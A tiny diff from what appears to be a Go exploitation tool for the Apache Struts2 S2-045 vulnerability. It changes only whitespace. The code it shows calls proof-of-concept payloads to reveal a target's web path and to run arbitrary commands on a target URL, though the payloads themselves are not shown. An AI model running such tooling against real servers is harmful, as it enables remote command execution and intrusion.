@@ -20,7 +20,7 @@ func Check(targetUrl string) {
 func GetWebpath(targetUrl string) {
     webpath := utils.PostFunc4Struts2(targetUrl, "", "qwer", utils.POC_s045_webpath)
     color.Green(webpath)
-
+    
 }
 func ExecCommand(targetUrl string, command string) {
     respString := utils.PostFunc4Struts2(targetUrl, "", "qwer", utils.POC_s045_exec(command))
